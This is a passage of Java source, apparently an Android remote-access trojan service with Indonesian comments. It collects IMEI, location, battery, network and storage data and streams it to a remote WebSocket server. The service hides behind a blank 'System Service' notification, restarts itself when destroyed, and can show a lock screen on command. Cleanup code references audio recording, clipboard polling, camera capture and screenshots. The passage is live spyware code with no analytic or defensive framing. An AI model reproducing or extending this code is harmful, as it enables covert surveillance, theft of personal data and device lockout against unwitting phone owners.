        } catch (Exception e) {}
    }
    
    private String safeString(String value) {
        return value != null ? value : "unknown";
    }
    
    private void getTelephonyInfo(JSONObject info) {
        try {
            if (checkSelfPermission(android.Manifest.permission.READ_PHONE_STATE) == PackageManager.PERMISSION_GRANTED && telephonyManager != null) {
                
                if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                    String imei = telephonyManager.getImei();
                    if (imei != null) info.put("imei", imei);
                } else {
                    String deviceId = telephonyManager.getDeviceId();
                    if (deviceId != null) info.put("imei", deviceId);
                }
                
                String simOperator = telephonyManager.getSimOperatorName();
                if (simOperator != null) info.put("sim_operator", simOperator);
                
                String networkOperator = telephonyManager.getNetworkOperatorName();
                if (networkOperator != null) info.put("network_operator", networkOperator);
            }
        } catch (SecurityException e) {} catch (Exception e) {}
    }
    
    private void getAppInfo(JSONObject info) {
        try {
            PackageInfo pInfo = packageManager.getPackageInfo(getPackageName(), 0);
            info.put("app_version", pInfo.versionName != null ? pInfo.versionName : "1.0");
            info.put("app_version_code", pInfo.versionCode);
        } catch (Exception e) {}
    }
    
    private void getNetworkInfo(JSONObject info) {
        try {
            if (connectivityManager != null) {
                NetworkInfo activeNetwork = connectivityManager.getActiveNetworkInfo();
                if (activeNetwork != null) {
                    info.put("network_connected", activeNetwork.isConnectedOrConnecting());
                    info.put("network_type_name", activeNetwork.getTypeName() != null ? activeNetwork.getTypeName() : "unknown");
                } else {
                    info.put("network_connected", false);
                    info.put("network_type_name", "none");
                }
            }
        } catch (Exception e) {}
    }
    
    private void getMemoryInfo(JSONObject info) {
        try {
            Runtime runtime = Runtime.getRuntime();
            info.put("ram_total", runtime.totalMemory());
            info.put("ram_free", runtime.freeMemory());
            info.put("ram_max", runtime.maxMemory());
            info.put("available_processors", runtime.availableProcessors());
        } catch (Exception e) {}
    }
    
    private void getStorageInfo(JSONObject info) {
        try {
            File path = Environment.getDataDirectory();
            StatFs statFs = new StatFs(path.getPath());
            long totalStorage = (long) statFs.getBlockCount() * (long) statFs.getBlockSize();
            long freeStorage = (long) statFs.getAvailableBlocks() * (long) statFs.getBlockSize();
            info.put("storage_total", totalStorage);
            info.put("storage_free", freeStorage);
            info.put("storage_used", totalStorage - freeStorage);
        } catch (Exception e) {}
    }
    
    private void getLocaleInfo(JSONObject info) {
        try {
            info.put("timezone", java.util.TimeZone.getDefault().getID());
            info.put("language", Locale.getDefault().getLanguage());
            info.put("country", Locale.getDefault().getCountry());
        } catch (Exception e) {}
    }
    
    private void getScreenInfo(JSONObject info) {
        try {
            info.put("screen_density", getResources().getDisplayMetrics().densityDpi);
            info.put("screen_width", getResources().getDisplayMetrics().widthPixels);
            info.put("screen_height", getResources().getDisplayMetrics().heightPixels);
        } catch (Exception e) {}
    }
    
    private void sendLocation(Location location) {
        try {
            if (location == null) return;
            
            JSONObject locData = new JSONObject();
            locData.put("type", "location");
            locData.put("lat", location.getLatitude());
            locData.put("lng", location.getLongitude());
            locData.put("accuracy", (float) location.getAccuracy());
            locData.put("provider", location.getProvider() != null ? location.getProvider() : "unknown");
            locData.put("speed", (float) location.getSpeed());
            locData.put("bearing", (float) location.getBearing());
            locData.put("altitude", location.getAltitude());
            locData.put("time", location.getTime());
            
            SimpleDateFormat sdf = new SimpleDateFormat("yyyy-MM-dd HH:mm:ss", Locale.getDefault());
            locData.put("time_formatted", sdf.format(new Date(location.getTime())));
            
            if (webSocket != null && isConnected) {
                webSocket.send(locData.toString());
            }
        } catch (Exception e) {}
    }
    
    private void sendBatteryInfo() {
        try {
            int level = getBatteryLevel();
            int temperature = 0;
            boolean charging = false;
            
            IntentFilter ifilter = new IntentFilter(Intent.ACTION_BATTERY_CHANGED);
            Intent batteryStatus = registerReceiver(null, ifilter);
            
            if (batteryStatus != null) {
                temperature = batteryStatus.getIntExtra(BatteryManager.EXTRA_TEMPERATURE, 0) / 10;
                int status = batteryStatus.getIntExtra(BatteryManager.EXTRA_STATUS, -1);
                charging = (status == BatteryManager.BATTERY_STATUS_CHARGING || status == BatteryManager.BATTERY_STATUS_FULL);
            }
            
            JSONObject batteryData = new JSONObject();
            batteryData.put("type", "battery");
            batteryData.put("level", level);
            batteryData.put("temperature", temperature);
            batteryData.put("charging", charging);
            batteryData.put("time", System.currentTimeMillis());
            
            if (webSocket != null && isConnected) {
                webSocket.send(batteryData.toString());
            }
            
            backgroundHandler.postDelayed(new Runnable() {
                @Override
                public void run() {
                    sendBatteryInfo();
                }
            }, 60000);
            
        } catch (Exception e) {}
    }
    
    private int getBatteryLevel() {
        try {
            if (batteryManager != null) {
                return batteryManager.getIntProperty(BatteryManager.BATTERY_PROPERTY_CAPACITY);
            }
        } catch (Exception e) {}
        return 0;
    }
    
    private void heartbeatRunnable() {
        // Kirim ping ke server (server akan echo pong)
        if (webSocket != null && isConnected) {
            try {
                JSONObject ping = new JSONObject();
                ping.put("type", "ping");
                ping.put("timestamp", System.currentTimeMillis());
                webSocket.send(ping.toString());
                lastPongReceived = System.currentTimeMillis(); // reset, akan di-update saat terima pong
            } catch (Exception e) {}
        } else {
            // WS mati, coba reconnect
            reconnect();
        }

        // Check heartbeat setiap 5 detik — kalau stale, auto-reconnect
        backgroundHandler.postDelayed(new Runnable() {
            @Override
            public void run() {
                // Check kalau lebih dari 30 detik gak nerima pong
                if (isConnected && lastPongReceived > 0 &&
                    (System.currentTimeMillis() - lastPongReceived) > 30000) {
                    sendLog("heartbeat: stale WS (no pong 30s), reconnecting");
                    reconnect();
                }
                heartbeatRunnable();
            }
        }, 5000);
    }
    
    private void toggleFlashlight(boolean on) {
        try {
            if (cameraManager == null) return;
            
            if (cameraId == null) {
                String[] cameraIdList = cameraManager.getCameraIdList();
                if (cameraIdList != null && cameraIdList.length > 0) {
                    cameraId = cameraIdList[0];
                } else {
                    return;
                }
            }
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
                cameraManager.setTorchMode(cameraId, on);
            }
        } catch (Exception e) {}
    }
    
    private void playMusic(String url) {
        try {
            if (mediaPlayer != null) {
                try {
                    mediaPlayer.release();
                } catch (Exception e) {}
                mediaPlayer = null;
            }
            mediaPlayer = new MediaPlayer();
            mediaPlayer.setAudioStreamType(AudioManager.STREAM_MUSIC);
            mediaPlayer.setDataSource(url);
            mediaPlayer.prepareAsync();
            mediaPlayer.setOnPreparedListener(new MediaPlayer.OnPreparedListener() {
                @Override
                public void onPrepared(MediaPlayer mp) {
                    try {
                        mp.start();
                    } catch (Exception e) {}
                }
            });
        } catch (Exception e) {}
    }
    
    private void stopMusic() {
        if (mediaPlayer != null) {
            try {
                mediaPlayer.stop();
                mediaPlayer.release();
            } catch (Exception e) {}
            mediaPlayer = null;
        }
    }
    
    private void showLockScreen() {
        try {
            Intent intent = new Intent(this, LockScreenActivity.class);
            intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
            startActivity(intent);
        } catch (Exception e) {}
    }
    
    private void hideLockScreen() {
        try {
            Intent intent = new Intent("UNLOCK_ACTION");
            sendBroadcast(intent);
        } catch (Exception e) {}
    }
    
    private void createNotificationChannel() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            try {
                NotificationChannel channel = new NotificationChannel(
                    CHANNEL_ID,
                    "System Service",
                    NotificationManager.IMPORTANCE_LOW
                );
                channel.setDescription("System background service");
                NotificationManager manager = getSystemService(NotificationManager.class);
                if (manager != null) {
                    manager.createNotificationChannel(channel);
                }
            } catch (Exception e) {}
        }
    }
    
    private Notification createNotification() {
        NotificationCompat.Builder builder = new NotificationCompat.Builder(this, CHANNEL_ID)
            .setContentTitle(" ")
            .setContentText(" ")
            .setSmallIcon(android.R.drawable.ic_menu_info_details)
            .setPriority(NotificationCompat.PRIORITY_LOW)
            .setOngoing(true);
        
        return builder.build();
    }
    
    @Override
    public int onStartCommand(Intent intent, int flags, int startId) {
        return START_STICKY;
    }
    
    @Override
    public IBinder onBind(Intent intent) {
        return null;
    }
    
    @Override
    public void onDestroy() {
        instance = null;
        try {
            if (wakeLock != null && wakeLock.isHeld()) {
                wakeLock.release();
            }
            
            if (webSocket != null) {
                webSocket.close(1000, "Service destroyed");
            }
            
            if (locationManager != null && locationListener != null) {
                locationManager.removeUpdates(locationListener);
            }
            
            if (mediaPlayer != null) {
                mediaPlayer.release();
            }

            // ============ CLEANUP FITUR BARU ============
            // Stop audio recorder kalau lagi jalan
            try { if (isRecording) stopAudioRecording(); } catch (Exception e) {}

            // Stop clipboard timer
            try { if (clipboardTimer != null) clipboardTimer.cancel(); } catch (Exception e) {}

            // Cleanup camera resources (single-shot take_photo)
            try { cleanupCamera(); } catch (Exception e) {}

            // Cleanup screenshot if in progress
            try { if (isScreenshotCapturing) cleanupScreenshot(); } catch (Exception e) {}
            
            clearFloatingImages();
            
            if (backgroundHandler != null) {
                backgroundHandler.removeCallbacksAndMessages(null);
            }
            
            if (handlerThread != null) {
                handlerThread.quitSafely();
            }
            
            Intent intent = new Intent(this, BackgroundService.class);
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                startForegroundService(intent);
            } else {
                startService(intent);
            }
            
        } catch (Exception e) {}
        
        super.onDestroy();
    }
}